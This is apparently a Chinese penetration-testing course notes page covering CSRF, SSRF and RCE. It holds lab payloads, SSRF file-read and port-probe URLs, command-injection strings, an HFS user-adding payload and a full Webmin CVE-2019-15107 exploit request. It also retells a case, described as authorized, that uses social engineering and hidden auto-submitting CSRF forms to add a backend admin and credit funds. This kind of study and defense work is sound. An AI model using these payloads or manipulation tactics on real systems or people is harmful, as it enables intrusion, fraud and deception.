---
title: XD安全渗透测试课程 Day 29-30 学习笔记：CSRF、SSRF 与 RCE 漏洞原理实战（补充真实攻击链案例）
description: 系统整理 XD安全渗透测试课程第 29-30 天学习内容：CSRF 跨站请求伪造原理与 Pikachu 靶场 GET/POST 型实战、SSRF
  服务端请求伪造漏洞挖掘点、内网端口探测与 file 协议利用、RCE 远程命令/代码执行成因及 Webmin CVE-2019-15107、Struts2、HFS
  经典案例复现。新增真实案例：通过社工诱导开发者嵌入恶意页面，结合 iframe 隐藏 CSRF 表单自动提交，实现后台添加管理员账号与充值功能的持久化攻击链。
category: program-analysis
tags:
- XD安全
- 渗透测试
- CSRF
- SSRF
- RCE
- Pikachu靶场
- Webmin
- Struts2
- HFS
- CVE-2019-15107
- 学习笔记
- 社工攻击
- 攻击链复现
date: 2024-01-15
updated: '2026-11-15'
---
## 概述

本页面整理自 XD安全渗透测试课程 Day 29-30 学习笔记（归档文章《XD安全渗透 学习笔记 | CSRF-SSRF阶段》），重点覆盖三大核心 Web 漏洞类型的成因、利用实战与防御思路：

- **Day 29**：CSRF 跨站请求伪造原理与 Pikachu 靶场 GET/POST 型实战演示；SSRF 服务端请求伪造漏洞挖掘点、内网端口探测、file 协议读取敏感文件实战。
- **Day 30**：RCE 远程命令/代码执行漏洞成因分析，Pikachu 靶场 Ping 命令注入实战，Webmin CVE-2019-15107 密码重置处命令注入复现，Struts2 与 HFS 经典 RCE 案例简述。

**本版本新增**：基于归档文章《一个猥琐的持续性攻击思路》的真实攻击链复现——通过社工诱导开发者嵌入恶意页面，结合 iframe 隐藏 CSRF 表单自动提交，实现后台添加管理员账号与充值功能的持久化攻击链。

页面在保留原文实战细节的基础上，按漏洞类型模块化组织，并交叉引用知识库中已有的 Pikachu 靶场系列、SSRF 利用指南、XD安全课程相关页面，形成可检索、可延伸的结构化知识页。

---

## CSRF 跨站请求伪造

### 核心原理

**CSRF（Cross-Site Request Forgery，跨站请求伪造）** 是一种挟制用户在当前已登录的 Web 应用程序上执行非本意操作的攻击方法。攻击者构造恶意页面，诱导已登录受害者访问，受害者浏览器会自动携带 Cookie 向目标站点发送伪造请求。

> **对比 XSS**：XSS 利用的是用户对指定网站的信任；CSRF 利用的是网站对用户浏览器的信任。

### Pikachu 靶场 GET 型 CSRF 实战

#### 环境拓扑
| 角色 | 系统 | IP | 说明 |
|------|------|----|------|
| 受害者/靶场 | Win10 + Pikachu | 192.168.168.1 | 模拟正常业务站点 |
| 攻击者 | Win7 | 192.168.168.128 | 托管恶意页面 |

#### 实战步骤
1. **登录 Pikachu 并抓包分析「修改个人信息」接口**  
   请求为 `GET /vul/csrf/csrfget/edit.php?sex=man&phon=13888888888&add=beijing&email=test%40test.com&submit=submit`，携带 `Cookie: PHPSESSID=...`。
2. **构造恶意页面 `index.html`**  
   ```html
   <img src="http://192.168.168.1/vul/csrf/csrfget/edit.php?sex=woman&phon=13999999999&add=shanghai&email=hack@hack.com&submit=submit">
   ```
3. **受害者访问恶意页面**  
   浏览器自动发起上述 GET 请求，携带合法 Cookie，服务端视为合法用户操作，个人信息被篡改。

> **实战提示**：超星尔雅学习通曾存在同类 CSRF，可一键修改他人性别、手机号等敏感信息。

#### POST 型 CSRF 构造思路
若目标接口为 POST，需在恶意页面构造 `<form method="POST" action="...">` 并通过脚本自动提交或诱导点击。

### 防御方案
1. **关键操作二次验证**：要求输入原始密码或短信验证码。
2. **随机 Token**：登录时下发唯一随机 Token，敏感请求必须携带并校验。
3. **同源策略 / Referer 校验**：校验 `Referer` 头是否为本站域名。
4. **验证码**：在敏感操作前增加图形/滑块验证码。
5. **限制请求方式**：仅接受 POST，拒绝 GET 修改状态。

> 相关实战可参考 [[pikachu-target-writeup-part3]] 中的 CSRF（GET/POST/Token）完整复现与防御分析。

---

## SSRF 服务端请求伪造

### 核心原理

**SSRF（Server-Side Request Forgery，服务端请求伪造）** 是攻击者构造请求，由**服务端**发起对内部/外部资源的访问。由于请求由服务端发起，可绕过防火墙访问内网隔离系统（内网探测、云元数据服务、本地服务等）。

> 成因：服务端提供「从指定 URL 获取数据」功能（分享、转码、翻译、图片加载、收藏、未公开 API 等），且未对目标地址做过滤与限制。

### 常见漏洞挖掘点与关键字

| 业务功能 | 典型场景 |
|----------|----------|
| 分享 | 通过 URL 分享网页内容 |
| 转码服务 | URL 转码适配移动端 |
| 在线翻译 | 百度/有道翻译远程 URL 内容 |
| 图片加载/下载 | 远程图片 URL 加载、下载 |
| 文章/图片收藏 | 收藏远程资源 |
| 未公开 API / 其他调用 URL 的功能 | 內部微服务调用、Webhook 回调 |

**URL 参数关键字**（配合 Google Hacking 语法挖掘）：
```
share, wap, url, link, src, source, target, u, 3g, display, sourceURL, imageURL, domain
```

### 自建环境实战：内网端口探测与 file 协议利用

#### 环境
- 靶机（模拟业务服务器）：Win7 `192.168.168.128:8089/SSRF/`
- 攻击机：Win10 `192.168.168.1`

#### 靶机业务代码 `ipindex.php`
```php
<?php
$url = $_GET['url'];
$content = file_get_contents($url);
header("Location: $url"); // 简化演示：直接跳转
?>
```
配合 `1.php` 回显访问者 IP：
```php
<?php echo $_SERVER['REMOTE_ADDR']; ?>
```

#### 攻击流程
1. **正常访问**：攻击机直接访问 `http://192.168.168.128:8089/SSRF/1.php`，回显攻击机公网 IP。
2. **SSRF 触发**：访问 `http://192.168.168.128:8089/SSRF/ipindex.php?url=http://127.0.0.1:8089/SSRF/1.php`  
   服务端以 `127.0.0.1` 身份访问自身，回显 `127.0.0.1` —— **实现内网身份访问**。
3. **内网端口探测**：遍历 `http://127.0.0.1:<PORT>`，识别开放服务（如 MySQL 3306、Redis 6379、Weblogic 7001 等）。
   - 示例：`?url=http://127.0.0.1:3306` 返回 MySQL 握手包特征，确认端口开放。
4. **file 协议读取敏感文件**（结合目录穿越）：
   ```
   ?url=file:///../../../../../../etc/passwd
   ?url=file:///C:/Windows/win.ini
   ```

> 详细的 `file_get_contents` 与 `curl` 协议支持差异、Gopher/FastCGI/Redis 利用链、DNS 重绑定绕过等进阶技巧，见 [[ssrf-ctf-exploitation-guide]] 与 [[ssrf-bypass-techniques]]。

### HFS RCE 关联利用（简述）
文章提及 HFS (Http File Server) 2.3m 版本存在 RCE，Payload 示例：
```
http://127.0.0.1:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}
```
> 该版本已修复，仅作思路记录。HFS 相关漏洞可关注 CVE-2024-23692 等最新披露。

---

## RCE 远程命令/代码执行

### 核心成因
Web 应用调用代码/命令执行函数（`eval`, `assert`, `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, `popen` 等）处理用户可控字符串，且未做充分过滤，导致攻击者注入任意命令或代码。

> 常见场景：Ping/Trace/Traceroute 功能、在线代码编辑器、模板渲染、反序列化、表达式引擎等。

### Pikachu 靶场 Ping 命令注入实战

#### 环境判断
抓包查看 `Server` 头或报错信息，确认靶场部署于 **Windows**（`Microsoft-IIS/10.0` 或 `Apache/2.4.x (Win32)`），故使用 Windows 命令（`dir`, `ipconfig`, `net user` 等）。

#### 漏洞触发点
「Ping 功能」输入框，后端拼接 `ping <user_input>` 直接执行。

#### 利用 Payload
```
127.0.0.1 | dir
127.0.0.1 && dir
127.0.0.1 & dir
```
返回结果中包含目录列表，命令执行成功。

> Pikachu RCE、文件包含、文件上传、越权完整复现见 [[pikachu-target-writeup-part4]]。

### Webmin CVE-2019-15107 密码重置命令注入复现

#### 漏洞条件
- Webmin ≤ 1.910
- `password_change.cgi` 修改密码功能存在后门植入逻辑
- 仅当 `user` 参数**非**系统已存在用户时，触发 `/etc/shadow` 写入分支，导致命令注入

#### 复现环境（Vulhub）
```bash
docker-compose up -d  # webmin/CVE-2019-15107
```
访问 `https://<IP>:10000`。

#### 攻击请求
```http
POST /password_change.cgi HTTP/1.1
Host: 192.168.168.136:10000
Cookie: redirect=1; testing=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```
- `user=rootxx`：不存在的用户名，进入漏洞分支
- `old=test|id`：管道符注入 `id` 命令

#### 结果验证
响应报错信息中回显 `uid=0(root) gid=0(root) groups=0(root)`，命令执行成功。

> 完整复现步骤与流量分析可参考 [[xd-security-vulnerability-discovery-notes-day42-45]] 中的 Webmin/CMS/框架漏洞挖掘路径。

### Struts2 与 HFS 经典 RCE 案例（简述）
- **Struts2**：S2-001 至 S2-061 系列 OGNL 表达式注入，Vulhub 提供全版本复现环境，建议逐版本复现理解 OGNL 执行机制。
- **HFS**：上文已述。
- **菜刀/蚁剑/一句话木马**：本质均为 RCE 后门，参考 [[php-webshell-fundamentals-chopper-analysis]] 与 [[php-webshell-obfuscation-av-evasion]]。

---

## 实战案例：社工诱导开发者嵌入恶意页面的 CSRF 持久化攻击链

> **来源**：归档文章《一个猥琐的持续性攻击思路》  
> **授权说明**：相关站点运维已授权，测试后已删除恶意代码并关闭站点。

### 攻击背景
- **目标**：某陪玩平台后台管理系统（非官方模板，个人开发）
- **前置发现**：后台存在 CSRF 漏洞（无 Token/Session 验证），可直接添加管理员账号
- **难点**：需管理员触发恶意页面，且开发者不直接访问攻击者控制的页面

### 攻击链完整复现

#### 第一阶段：漏洞挖掘与 CSRF POC 构造
1. **越权测试发现**：修改密码、充值等接口数据包中无用户标识，仅含新旧密码/金额参数
2. **CSRF 验证**：构造 POC 直接添加管理员账号成功
3. **功能点确认**：
   - 添加管理员：`/Qwadmin/Peiwanmember/update.html` (POST)
   - 充值功能：`/Qwadmin/Peiwanmember/chongzhi.html` (POST)

#### 第二阶段：社工准备与恶意页面制作
1. **目标锁定**：通过聊天套近乎，确认开发者维护多个工会网站，具备后台权限
2. **心理战术**：
   - 伪装成需求方，声称购买源码/数据
   - 以「测试演示」为由要求开发者访问指定页面
3. **恶意页面设计**（两个隐藏 CSRF 表单）：

**tianjia.html - 添加管理员账号**
```html
<html>
<body>
  <form action="http://XXX.xxxxxx.com/Qwadmin/Peiwanmember/update.html" method="POST" name="myfrom">
    <input type="hidden" name="head" value="" />
    <input type="hidden" name="user" value="ooo" />
    <input type="hidden" name="bid" value="5" />
    <input type="hidden" name="group_id" value="1" />
    <input type="hidden" name="password" value="123123" />
    <input type="hidden" name="sex" value="0" />
    <input type="hidden" name="fenlei_15" value="" />
    <input type="hidden" name="fenlei_16" value="" />
    <input type="hidden" name="fenlei_17" value="" />
    <input type="hidden" name="phone" value="" />
    <input type="hidden" name="qq" value="" />
    <input type="hidden" name="yyid" value="" />
    <input type="hidden" name="email" value="" />
    <input type="hidden" name="zhifubao" value="" />
    <input type="hidden" name="zhekou" value="100" />
    <input type="hidden" name="tichengbili" value="70" />
    <input type="hidden" name="info" value="" />
    <script>
      function sub(){ document.myfrom.submit(); }
      setTimeout(sub, 100);  // 页面加载 0.1 秒后自动提交
    </script>
  </form>
</body>
</html>
```

**chongzhiyy.html - 自动充值**
```html
<html>
<body>
  <form action="http://XXX.xxxxxx.com/Qwadmin/Peiwanmember/chongzhi.html" method="POST" name="myfrom">
    <input type="hidden" name="aids" value="6018" />
    <input type="hidden" name="numchong" value="300" />
    <input type="hidden" name="numchongtype" value="5" />
    <input type="hidden" name="numzeng" value="" />
    <input type="hidden" name="oid" value="" />
    <input type="hidden" name="cinfo" value="20170507200040011220210053559226+300+伪造订单号" />
    <input type="hidden" name="numchongisshow" value="0" />
    <input type="hidden" name="numchongshowinfo" value="充值成功" />
    <script>
      function sub(){ document.myfrom.submit(); }
      setTimeout(sub, 100);
    </script>
  </form>
</body>
</html>
```

#### 第三阶段：iframe 隐藏与持久化投递
1. **问题**：表单提交会导致页面跳转，暴露异常
2. **解决**：构造主页面 `index.html`，通过 iframe 嵌入两个 POC 页面
```html
<iframe src="tianjia.html" style="display:none;"></iframe>
<iframe src="chongzhiyy.html" style="display:none;"></iframe>
```
- `display:none` 隐藏 iframe，用户无感知
- 表单提交仅在 iframe 内跳转，不影响主页面展示
3. **投递方式**：社工诱导开发者在后台「公告/广告/自定义页面」功能中嵌入该恶意页面链接或直接写入 iframe 代码

#### 第四阶段：攻击触发与清理
1. **等待触发**：管理员登录后台访问含恶意 iframe 的页面 → 自动添加管理员账号 + 充值
2. **验证成功**：攻击者使用新账号登录后台，确认权限获取
3. **痕迹清理**：攻击触发前主动删除恶意代码、关闭测试站点、协调处理事件

### 攻击链关键技术点总结

| 环节 | 技术点 | 关键细节 |
|------|--------|----------|
| 漏洞利用 | CSRF 无防护 | 无 Token、Referer 校验，关键操作仅靠 Cookie 认证 |
| 武器化 | POST 型 CSRF 自动提交 | `setTimeout(sub, 100)` 实现无交互自动提交 |
| 隐蔽性 | iframe 隔离跳转 | `display:none` 隐藏 iframe，表单提交不污染主页面 |
| 社工诱导 | 角色扮演 + 信任建立 | 伪装买家，通过「测试演示」合理化访问请求 |
| 持久化 | 后台功能植入 | 利用公告/广告等合法功能长期托管恶意代码 |
| 痕迹管理 | 主动清理与协调 | 攻击前清理、事后沟通，体现授权测试规范 |

### 防御启示
1. **全站 CSRF 防护**：所有状态修改接口强制校验随机 Token / SameSite Cookie
2. **后台内容安全策略**：限制公告/广告等功能的 HTML 输入，禁止 iframe、script 标签
3. **管理员操作审计**：关键操作（添加管理员、充值）记录操作人、来源 IP、Referer
4. **社工意识培训**：开发/运维人员需警惕「测试演示」「源码交易」等社工话术
5. **最小权限原则**：后台账号分级，日常运营账号无添加管理员权限

> 该案例展示了 **「漏洞利用 + 武器化投递 + 社工绕过 + 持久化控制」** 的完整攻击链，是 CSRF 从「理论可利用」转化为「实战高危」的典型范例。

---

## 交叉引用与延伸阅读

| 专题 | 页面 | 说明 |
|------|------|------|
| Pikachu 靶场 CSRF/SQLi 完整复现 | [[pikachu-target-writeup-part3]] | GET/POST/Token 型 CSRF、全类型 SQLi |
| Pikachu 靶场 RCE/文件包含/上传/越权 | [[pikachu-target-writeup-part4]] | Ping/Eval RCE、LFI/RFI、多层上传绕过、水平/垂直越权 |
| Pikachu 靶场 SSRF/XXE/反序列化 | [[pikachu-target-writeup-part5]] | SSRF 内网探测、XXE、PHP 反序列化、不安全重定向 |
| SSRF 协议差异与利用链（file_get_contents vs curl） | [[ssrf-ctf-exploitation-guide]] | dict/gopher/file/php 伪协议、FastCGI/Redis 攻击面 |
| SSRF 五大核心绕过技巧 | [[ssrf-bypass-techniques]] | 用户信息、十六进制 IP、302 跳转、DNS 重绑定、localhost 绕过 |
| XD安全 Day 25-28 XSS 专题 | [[xd-security-xss-vulnerability-notes-day25-28]] | XSS 分类、BeEF、HttpOnly 绕过、WAF 绕过 |
| XD安全 Day 31-32 文件包含专题 | [[xd-security-file-inclusion-notes]] | LFI/RFI、伪协议、文件下载漏洞、敏感路径清单 |
| XD安全 Day 33-36 逻辑漏洞专题 | [[xd-security-logic-vulnerability-notes-day33-36]] | 越权、支付篡改、验证码/Token 绕过、AuthCheck 工具 |
| XD安全 Day 37-39 反序列化/XXE 专题 | [[xd-security-deserialization-xxe-notes-day37-39]] | PHP/Java 反序列化、魔术方法、ysoserial、Blind XXE |
| Webmin/Struts2/CMS 漏洞挖掘实战 | [[xd-security-vulnerability-discovery-notes-day42-45]] | Goby/Nessus/Nmap/Metasploit/Searchsploit 工具链 |
| PHP Webshell 基础与蚁剑/菜刀流量分析 | [[php-webshell-fundamentals-chopper-analysis]] | 一句话木马原理、Content-Type 绕过、攻防世界实战 |
| Shellshock CVE-2014-6271 CGI 利用链 | [[0w1club-training-shellshock-cgi-exploitation]] | User-Agent 注入反弹 Shell、Dirty COW 提权全链路 |
| VulnHub DOUBLETROUBLE 靶机复现 | [[vulnhub-doubletrouble-writeup]] | Shellshock + Dirty COW 完整攻击链 |
| 社工钓鱼网站制作入门 | [[phishing-website-creation-tutorial]] | SET工具、PHP表单劫持、Docker部署靶场 |
| 红队 OPSEC 实战守则 | [[redteam-hw-opsec-guidelines]] | 环境隔离、工具指纹清洗、C2隐匿、日志反取证 |

---

## 附录：原文参考链接

- CSRFTester 工具：`https://pan.baidu.com/s/1bp96ECJ`
- SSRF 漏洞深度文章：`https://www.t00ls.net/articles-41070.html`
- Java Web 代码审计入门：`https://www.cnblogs.com/ermei/p/6689005.html`
- CVE-2019-11043 PHP-FPM 研究：`http://blog.leanote.com/post/snowming/9da184ef24bd`
- 真实攻击链案例来源：《一个猥琐的持续性攻击思路》（微信公众号归档文章）

---

> 本页面为知识库结构化沉淀，后续可在实战复现、工具自动化、变种挖掘等方向持续扩展。建议配合上述交叉引用页面形成完整攻防知识体系。真实案例部分展示了 CSRF 漏洞在社工配合下的高危转化路径，为蓝队防御提供了「技术防护 + 管理规范 + 人员意识」三维度的参考。

## 来源

- [226安全团队-201805-202103_44](../sources/226安全团队-201805-202103_44.md)
